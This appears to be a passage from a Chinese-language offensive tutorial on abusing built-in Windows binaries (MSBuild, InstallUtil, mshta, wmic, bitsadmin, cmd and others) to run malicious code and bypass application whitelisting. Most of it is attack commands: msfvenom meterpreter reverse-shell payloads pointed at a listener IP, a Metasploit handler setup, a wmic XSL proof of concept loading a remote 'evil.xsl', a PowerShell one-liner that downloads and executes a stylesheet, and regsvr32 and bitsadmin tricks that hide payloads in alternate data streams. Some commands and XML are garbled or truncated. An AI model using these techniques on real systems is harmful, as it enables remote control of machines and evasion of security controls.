下载的文件，执行特殊的操作，
加载我们写的恶意代码或者绕过系统的白名单检测，得到我们想要的攻击目的。
参考：https://lolbas-project.github.io/ https://github.com/LOLBAS-
Project/LOLBAS
## MSBuild.exe
MSBuild 是Microsoft Build Engine 的缩写，代表Microsoft 和Visual Studio
的新的生成平台，它可在未安装Visual Studio 的环境中编译.net 的工程文件，
MSBuild 可编译特定格式的xml 文件
简单说就是msbuild 可以编译执行csharp 代码。
> **文件路径**C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe
> C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe
####### 执行恶意代码
可以用metersploit 生成shellcode，
> msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.1.130
> lport=4444
>
> -f csharp
然后通过修改[模板](https://github.com/3gstudent/msbuild-inline-task)，加入我们生成的shellcode
然后msf 监听
> msfconsole
>
> use exploit/multi/handler
>
> set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 172.16.1.130
>
> set LPORT 4444set ExitOnSession falseset autorunscript migrate -n
> explorer.exe exploit -j
在目标机器上运行
> C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\>MSBuild.exe
> \"C:\\Users\\jack. 0DAY\\Desktop\\exec.xml\"
然后会话上线，并且正常执行命令
## Installutil.exe
Installer
工具是一个命令行实用程序，允许您通过执行指定程序集中的安装程序组件来安装和卸载服务器资源。此工具与System.Configuration.Install
命名空间中的类一起使用。
####### 文件路径
> C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe
>
> C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\InstallUtil.exe
> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe
> C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe
####### 执行恶意代码
通过msfvenom 生成C＃的shellcode
> msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.1.130
> lport=4444 -f cs harp
下载InstallUtil-Shellcode.cs，将上面生成的shellcode 复制到该cs 文件中
csc 编译执行InstallUtil-ShellCode.cs
> C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe
> /logfile= /LogTo Console=false /U D:\\test\\InstallUtil-shell.exe
## mshta.exe
mshta.exe 是Windows 用于运行Microsoft HTML 的应用程序。
> **文件路径**C:\\Windows\\System32\\mshta.exe
> C:\\Windows\\SysWOW64\\mshta.exe
####### 执行恶意代码
mshta 是在环境变量里的，我们可以直接将metasploit 生成的shellcode
插入到hta 文件模板中进行加载。
> msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.1.130
> lport=4444 ‐f ra w \> shellcode.bin
>
> cat shellcode.bin \| base64 ‐w 0
然后替换文件模板中的shellcode 文件链接 可以将hta
托管出来,然后目标机器执行如下代码
> mshta.exe 
## Msiexec.exe
Msiexec 是 Windows Installer 的一部分。用于安装 Windows Installer 安装包
（MSI）,一般在运行 Microsoft Update
安装更新或安装部分软件的时候出现，占用内存比较大。并且集成于 Windows
2003，Windows 7 等。Msiexec 已经被添加到环境变量了。
> **文件路径**C:\\Windows\\System32\\msiexec.exe
> C:\\Windows\\SysWOW64\\msiexec.exe
####### 执行恶意代码
> msiexec.exe /q /i 
## wmic.exe
WMIC 扩展WMI（Windows Management Instrumentation，Windows 管理工具）
，提供了从命令行接口和批命令脚本执行系统管理的支持的应用程序。
> **文件路径**C:\\Windows\\System32\\wbem\\wmic.exe
> C:\\Windows\\SysWOW64\\wbem\\wmic.exe
####### 执行恶意代码
> wmic os get /FORMAT:\"\"
poc 测试代码
> \\"\>
>
> \
> Original publication:
>
> https://subt0x11.blogspot.lu/2018/04/wmicexe-whitelisting-bypass-hacking.html
>
> Microsoft documentation:
>
> https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scrip
> ting-using-msxsl-script
>
> Use-case/main objective:
>
> \- Windows Script Host is disabled or blocked
>
> unconstrained script host bypass for Windows Defender Application
> Control
>
> WMIC can invoke XSL (eXtensible Stylesheet Language) scripts, either
> locally or fro m a URL.
>
> Proof of concept based on C:\\Windows\\System32\\wbem\\texttable.xsl
> PoC examples:
>
> wmic process LIST /FORMAT:\"C:\\Users\\WMI\\poc-wmic.xsl\"
>
> OR:
>
> wmic process get brief /format:\"C:\\Users\\WMI\\poc-wmic.xsl\"
>
> wmic process LIST
> /FORMAT:\"\\\\127.0.0.1\\c\$\\Users\\WMI\\poc-wmic.xsl\"
>
> #cat poc-wmic.xsl:
>
> \
>
> \
> xmlns=\"\" xmlns:ms=\"urn:sch
> emas-microsoft-com:xslt\"
>
> xmlns:user=\"placeholder\" version=\"1.0\"\>
>
> \
>
> \
>
> \
> var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd.exe /k ech
>
> o \'Tapz!\'\");
>
> \]\]\> \
>
> \
>
> Remote File example:
>
> wmic os get /FORMAT:\"https://example.com/evil.xsl\"
>
> Basic PoC payload using Powershell oneliner + proxy authentication
> (from IE confi g.):
>
> PS C:\\Users\\pwnd\\Desktop\> powershell -exec bypass -c \"(New-Object
> Net.WebCl
> ient).Proxy.Credentials=\[Net.CredentialCache\]::DefaultNetworkCredentials;iwr(\'192.1
> 68.13.37/test2.xsl\') -outfile test2.xsl\";\$cmd=\"wmic os get
> /format:\'test2.xsl\'\"; iex \$ cmd
>
> Post-exploit Project that already implement this king of lateral
> movement: https://github.com/zerosum0x0/koadic
>
> \--\>
>
> \\ CreateObject(\"Wscript.Shell\")
>
> Call shl.Run(\"\"\"calc.exe\"\"\")
>
> \]\]\>\
>
> \\ select=\"//RESULTS\"/\>\ select=\"//INSTANCE\"/\>\ language=\"VBScript\"\>
> DisplayValues(this)\\
>
> \\ language=\"VBScript\"
>
> \>CountResults(this)\\
>
> \\ language=\"VBScript\"\>GotInstance()\ sl:eval\>\ select=\"PROPERTY\|PROPERTY.ARRAY\|PROPERTY.RE
> FERENCE\"/\>\
>
> \
## Atbroker.exe
Atbroker.exe 是微软的辅助技术(Assistive Technology)组件
####### 文件路径
> C:\\Windows\\System32\\Atbroker.exe
>
> C:\\Windows\\SysWOW64\\Atbroker.exe
####### 执行恶意代码恶意代码
> ATBroker.exe /start shellcode
用法：执行在注册表中为新AT
定义的代码。必须对系统注册表进行修改，以注册或修改现有的Assistibe
Technology（AT）服务条目。 所需权限：User 操作系统：Windows 8，Windows
8.1，Windows 10
详细参见： 
run-key-part-42/
## Bash.exe
此文件存在于window 10 上有linux 子系统的系统上
> **路径**C:\\Windows\\System32\\bash.exe
> C:\\Windows\\SysWOW64\\bash.exe
####### 执行恶意代码恶意代码
从bash.exe 执行calc.exe
> bash.exe -c shellcode.exe
用例：执行指定文件，可用作逃避杀软检测,可用于绕过应用白名单。 所需权限：
User 操作系统：Windows 10
## Bitsadmin.exe
windows 用于管理后台智能传输的文件
> **文件路径**C:\\Windows\\System32\\bitsadmin.exe
> C:\\Windows\\SysWOW64\\bitsadmin.exe
####### 传送并执行恶意命令
例如：创建名为 1 的bitsadmin 作业，将cmd.exe
添加到作业，配置作业以从备用数据流运行目标命令，然后恢复并完成作业。
> bitsadmin /create 1 bitsadmin /addfile 1
> c:\\windows\\system32\\cmd.exe c:\\data\\pla yfolder\\cmd.exe
> bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe N
> ULL bitsadmin /RESUME 1 bitsadmin /complete 1
用例：在备用数据流中执行指定文件，可用作防御性逃避或持久性技术。
所需权限：User 操作系统：Windows Vista，Windows 7，Windows 8，Windows
8.1，Windows 10
## Cmd.exe
Windows 中的命令行解释器
> **文件路径**C:\\Windows\\System32\\cmd.exe
> C:\\Windows\\SysWOW64\\cmd.exe
####### 执行恶意代码
将内容添加到数据流（ADS）。
> cmd.exe /c echo regsvr32.exe \^/s \^/u
> \^/i:https://raw.githubusercontent.com/redca
> naryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct \^scrobj.dll
> \> fakefile. doc:payload.bat
执行存储在备用数据流中的payload.bat（ ADS）。
> cmd.exe - \< fakefile.doc:payload.bat
用例：可用于规避防御性对策或隐藏为持久性机制 所需权限：User 操作系统：
Windows vista，Windows 7，Windows 8，Windows 8.1，Windows 10